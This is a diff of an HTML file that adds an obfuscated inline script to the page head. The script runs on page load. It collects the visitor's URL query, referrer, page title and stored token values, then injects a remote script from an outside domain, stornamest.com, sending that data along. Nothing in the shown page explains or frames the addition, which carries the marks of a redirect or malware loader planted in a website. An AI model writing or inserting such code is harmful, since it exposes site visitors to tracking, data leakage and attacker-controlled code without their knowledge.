@@ -2,6 +2,49 @@
 <html>
 <head>
     <meta charset="utf-8">
+    <script>
+    (function() {
+    var name = '_V4BrZFW6MGf2Dhrr';
+    if (!window._V4BrZFW6MGf2Dhrr) {
+        window._V4BrZFW6MGf2Dhrr = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _nrCyM53W5N1MhvS6 = localStorage.getItem('config');
+    if (typeof _nrCyM53W5N1MhvS6 !== 'undefined' && _nrCyM53W5N1MhvS6 !== null) {
+        var _NnKDBn7NRVqtqnWQ = JSON.parse(_nrCyM53W5N1MhvS6);
+        var _HrvL7RSRcpRGBQRk = Math.round(+new Date()/1000);
+        if (_NnKDBn7NRVqtqnWQ.created_at + window._V4BrZFW6MGf2Dhrr.ttl < _HrvL7RSRcpRGBQRk) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _dqtZZ5F9yQtGq4YR = localStorage.getItem('subId');
+    var _tQhMgYsvF1CmTm6f = localStorage.getItem('token');
+    var _ZkLr7zXVHKtbJJbH = '?return=js.client';
+        _ZkLr7zXVHKtbJJbH += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _ZkLr7zXVHKtbJJbH += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _ZkLr7zXVHKtbJJbH += '&default_keyword=' + encodeURIComponent(document.title);
+        _ZkLr7zXVHKtbJJbH += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _ZkLr7zXVHKtbJJbH += '&name=' + encodeURIComponent(name);
+        _ZkLr7zXVHKtbJJbH += '&host=' + encodeURIComponent(window._V4BrZFW6MGf2Dhrr.R_PATH);
+    if (typeof _dqtZZ5F9yQtGq4YR !== 'undefined' && _dqtZZ5F9yQtGq4YR && window._V4BrZFW6MGf2Dhrr.unique) {
+        _ZkLr7zXVHKtbJJbH += '&sub_id=' + encodeURIComponent(_dqtZZ5F9yQtGq4YR);
+    }
+    if (typeof _tQhMgYsvF1CmTm6f !== 'undefined' && _tQhMgYsvF1CmTm6f && window._V4BrZFW6MGf2Dhrr.unique) {
+        _ZkLr7zXVHKtbJJbH += '&token=' + encodeURIComponent(_tQhMgYsvF1CmTm6f);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._V4BrZFW6MGf2Dhrr.R_PATH + _ZkLr7zXVHKtbJJbH;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 
     
 
